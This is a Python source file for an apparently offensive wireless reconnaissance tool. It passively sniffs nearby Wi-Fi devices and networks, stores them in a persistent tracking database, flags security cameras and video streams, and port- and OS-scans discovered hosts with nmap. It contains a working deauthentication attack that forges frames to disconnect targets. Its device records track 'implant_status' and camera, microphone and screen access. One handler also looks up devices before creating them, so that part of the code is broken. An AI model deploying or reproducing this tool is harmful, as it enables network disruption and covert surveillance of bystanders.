import threading
import time
import subprocess
import re
import nmap
import subprocess
import re
from collections import defaultdict
from scapy.all import sniff, Dot11, Dot11ProbeReq, Dot11Beacon, Dot11Elt, RadioTap, Dot11Deauth, sendp
import db_core

class DeviceScanner:
    def __init__(self, interface):
        self.interface = interface
        self.devices = {} # mac -> info
        self.networks = {} # bssid -> info (SSID, signal, encryption)
        self.lock = threading.Lock()
        self._running = False
        self._thread = None
        self._hop_thread = None
        self._oui_cache = {}
        self.cctv_vendors = [
            "hikvision", "dahua", "wyze", "ring", "nest", "arlo", 
            "hanwha", "amcrest", "reolink", "tp-link", "ezviz", "vivotek"
        ]
        
        # Load persistent intelligence DB
        db_core.init_db()
        for dev in db_core.get_all_devices():
            dev["ssids"] = set(dev["ssids"])
            self.devices[dev["mac"]] = dev

    def start(self):
        self._running = True
        threading.Thread(target=self._sniff_wifi, daemon=True).start()
        threading.Thread(target=self._enrich_loop, daemon=True).start()
        threading.Thread(target=self._hop_channels, daemon=True).start()
        threading.Thread(target=self._port_scan_loop, daemon=True).start()

    def stop(self):
        self._running = False

    def _sniff_wifi(self):
        def handler(pkt):
            if not self._running:
                return

            if pkt.haslayer(Dot11):
                # Extract source MAC
                src = pkt[Dot11].addr2
                if not src or src == "ff:ff:ff:ff:ff:ff":
                    return

                signal = -100
                if pkt.haslayer(RadioTap):
                    try:
                        signal = pkt[RadioTap].dBm_AntSignal
                    except:
                        pass

                ssid = ""
                if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeReq):
                    ssid = None
                    try:
                        ssid = pkt[Dot11Elt].info.decode(errors="ignore")
                    except:
                        pass
                    
                    if pkt.haslayer(Dot11Beacon):
                        bssid = pkt.addr3
                        with self.lock:
                            if bssid not in self.networks:
                                self.networks[bssid] = {
                                    "ssid": ssid or "<Hidden>",
                                    "signal": signal, # Use the extracted signal
                                    "first_seen": time.time(),
                                    "vendor": self._oui_lookup(bssid)
                                }
                            else:
                                self.networks[bssid]["signal"] = signal # Use the extracted signal
                                
                            # Persist network
                            db_core.upsert_network(self.networks[bssid])

                    if ssid:
                        self.devices[src]["ssids"].add(ssid)
                    
                pkt_type = "probe"
                if pkt.type == 0 and pkt.subtype == 8:
                    pkt_type = "beacon"
                elif pkt.type == 2:
                    pkt_type = "data"

                with self.lock:
                    if src not in self.devices:
                        self.devices[src] = {
                            "mac": src,
                            "signal": signal,
                            "ssids": set(),
                            "vendor": self._oui_lookup(src),
                            "is_cctv": False,
                            "is_streaming": False,
                            "packet_sizes": [],
                            "ssids": set(),
                            "associated_ap": None,
                            "type": "unknown",
                            "pkt_type": pkt_type,
                            "first_seen": time.time(),
                            "last_seen": time.time(),
                            "packets": 1,
                            "implant_status": "none",
                            "ip": None,
                            "open_ports": [],
                            "os_guess": "Unknown",
                            "last_scan": 0,
                            "access": {
                                "camera_front": False,
                                "camera_back": False,
                                "microphone": False,
                                "screen": False
                            }
                        }
                    else:
                        self.devices[src]["last_seen"] = time.time()
                        self.devices[src]["packets"] += 1
                        self.devices[src]["signal"] = signal

                    if ssid:
                        self.devices[src]["ssids"].add(ssid)
                    
                    # Try to find associated AP from data frames
                    if pkt.type == 2: # Data frame
                        # addr1=receiver, addr2=transmitter, addr3=BSSID
                        if pkt.addr1 == src: # Incoming to device
                            self.devices[src]["associated_ap"] = pkt.addr3
                        elif pkt.addr2 == src: # Outgoing from device
                            self.devices[src]["associated_ap"] = pkt.addr3

                    # Traffic analysis for video detection
                    size = len(pkt)
                    self.devices[src]["packet_sizes"].append(size)
                    if len(self.devices[src]["packet_sizes"]) > 50:
                        self.devices[src]["packet_sizes"].pop(0)
                    
                    # If high average packet size and high packet count, likely streaming
                    if len(self.devices[src]["packet_sizes"]) > 10:
                        avg_size = sum(self.devices[src]["packet_sizes"]) / len(self.devices[src]["packet_sizes"])
                        if avg_size > 500: # Typical for video chunks in management/data frames
                            self.devices[src]["is_streaming"] = True
                            
                    # Throttle database writes to every 10 packets or new ssid
                    if self.devices[src]["packets"] % 10 == 0 or ssid:
                        db_core.upsert_device(self.devices[src])

        try:
            # Check if interface is actually in Monitor Mode
            is_monitor = False
            try:
                out = subprocess.check_output(["iw", "dev", self.interface, "info"]).decode()
                if "type monitor" in out.lower():
                    is_monitor = True
            except:
                pass
                
            if is_monitor:
                sniff(iface=self.interface, prn=handler, store=0,
                      monitor=True, filter="type mgt or type data")
            else:
                print(f"[*] {self.interface} is in Managed Mode. Sniffing without Monitor/BPF filters...")
                sniff(iface=self.interface, prn=handler, store=0)
                
        except Exception as e:
            print(f"[!] Sniff error: {e}")


    def _oui_lookup(self, mac):
        prefix = mac[:8].upper().replace(":", "")
        # Use OUI database exclusively
        try:
            r = subprocess.run(["grep", "-i", prefix[:6], "/usr/share/ieee-data/oui.txt"],
                               capture_output=True, text=True, timeout=2)
            if r.stdout:
                return r.stdout.split("\t")[-1].strip()[:30]
        except:
            pass
        return "Unknown"

    def send_deauth(self, target_mac, ap_mac=None, count=10):
        """Send deauth packets to a target, optionally from a specific AP"""
        if not ap_mac:
            # Try to get associated AP from our discovery
            with self.lock:
                ap_mac = self.devices.get(target_mac, {}).get("associated_ap")
        
        if not ap_mac:
            print(f"[!] Cannot deauth {target_mac}: No associated AP known.")
            return False

        print(f"[*] Sending {count} deauths to {target_mac} via {ap_mac}...")
        
        # Packet: RadioTap / Dot11 (to target from AP) / Dot11Deauth
        dot11 = Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac)
        pkt = RadioTap() / dot11 / Dot11Deauth(reason=7)
        
        # Also send broadcast deauth from AP just in case
        dot11_brm = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=ap_mac, addr3=ap_mac)
        pkt_brm = RadioTap() / dot11_brm / Dot11Deauth(reason=7)
        
        try:
            sendp(pkt, iface=self.interface, count=count, inter=0.1, verbose=False)
            sendp(pkt_brm, iface=self.interface, count=count//2, inter=0.1, verbose=False)
            return True
        except Exception as e:
            print(f"[!] Deauth error: {e}")
            return False

    def _hop_channels(self):
        """Rotate through WiFi channels to find more devices"""
        channels = [1, 6, 11, 3, 8, 2, 7, 12, 4, 9, 13, 5, 10]
        i = 0
        while self._running:
            ch = channels[i % len(channels)]
            try:
                subprocess.run(["iw", "dev", self.interface, "set", "channel", str(ch)], 
                             check=True, capture_output=True)
            except:
                pass
            i += 1
            time.sleep(3)

    def _get_arp_table(self):
        """Read system ARP table to map MACs to IPs"""
        arp_map = {}
        try:
            with open("/proc/net/arp", "r") as f:
                lines = f.readlines()[1:]
            for line in lines:
                parts = line.split()
                if len(parts) >= 4:
                    ip = parts[0]
                    mac = parts[3].lower()
                    if mac != "00:00:00:00:00:00":
                        arp_map[mac] = ip
        except:
            pass
        return arp_map

    def _port_scan_loop(self):
        """Background loop to actively scan discovered devices with IPs"""
        nm = nmap.PortScanner()
        while self._running:
            arp_map = self._get_arp_table()
            targets_to_scan = []
            
            with self.lock:
                for mac, dev in self.devices.items():
                    # Update IP if found in ARP table
                    if mac in arp_map and not dev.get("ip"):
                        dev["ip"] = arp_map[mac]
                    
                    # Select devices for scanning (have IP, haven't been scanned recently - >5 mins)
                    if dev.get("ip") and (time.time() - dev.get("last_scan", 0) > 300):
                        targets_to_scan.append((mac, dev["ip"]))

            for mac, ip in targets_to_scan:
                if not self._running:
                    break
                
                try:
                    print(f"[*] Scanning {ip} ({mac}) for open ports and OS...")
                    # -sV for service versions, -O for OS detection (requires root, but we try anyway)
                    # Use --unprivileged and -sT to fallback if root is not available
                    # Top 100 ports to be fast
                    nm.scan(hosts=ip, arguments="-sT -sV -O --top-ports 100 -T4 --unprivileged", timeout=30)
                    
                    if ip in nm.all_hosts():
                        open_ports = []
                        for proto in nm[ip].all_protocols():
                            for port in nm[ip][proto]:
                                port_info = nm[ip][proto][port]
                                if port_info["state"] == "open":
                                    open_ports.append({
                                        "port": port,
                                        "protocol": proto,
                                        "name": port_info.get("name", "unknown"),
                                        "product": port_info.get("product", ""),
                                        "version": port_info.get("version", "")
                                    })
                        
                        os_guess = "Unknown"
                        if "osmatch" in nm[ip] and nm[ip]["osmatch"]:
                            os_guess = nm[ip]["osmatch"][0].get("name", "Unknown")
                            
                        with self.lock:
                            if mac in self.devices:
                                self.devices[mac]["open_ports"] = open_ports
                                if os_guess != "Unknown":
                                    self.devices[mac]["os_guess"] = os_guess
                                self.devices[mac]["last_scan"] = time.time()
                                db_core.upsert_device(self.devices[mac])
                except Exception as e:
                    print(f"[!] Scan error for {ip}: {e}")
                    with self.lock:
                        if mac in self.devices:
                            self.devices[mac]["last_scan"] = time.time() # don't retry immediately on failure
            
            time.sleep(10)

    def _enrich_loop(self):
        while self._running:
            with self.lock:
                for mac, dev in self.devices.items():
                    vendor = dev["vendor"].lower()
                    if "apple" in vendor:
                        dev["type"] = "iPhone/iPad"
                    elif "samsung" in vendor:
                        dev["type"] = "Samsung Android"
                    elif "google" in vendor:
                        dev["type"] = "Pixel"
                    elif "huawei" in vendor:
                        dev["type"] = "Huawei"
                    elif "oneplus" in vendor:
                        dev["type"] = "OnePlus"
                    
                    # CCTV Detection
                    for cv in self.cctv_vendors:
                        if cv in vendor:
                            dev["is_cctv"] = True
                            dev["type"] = "CCTV/Camera"
                            break
            time.sleep(5)

    def get_devices(self):
        with self.lock:
            result = []
            for mac, dev in self.devices.items():
                d = dict(dev)
                d["ssids"] = list(d["ssids"])
                d["age"] = int(time.time() - d["first_seen"])
                result.append(d)
            return sorted(result, key=lambda x: x["signal"], reverse=True)

    def get_networks(self):
        with self.lock:
            return [dict(n, bssid=b) for b, n in self.networks.items()]

    def get_device(self, mac):
        with self.lock:
            dev = self.devices.get(mac)
            if dev:
                d = dict(dev)
                d["ssids"] = list(d["ssids"])
                return d
            return None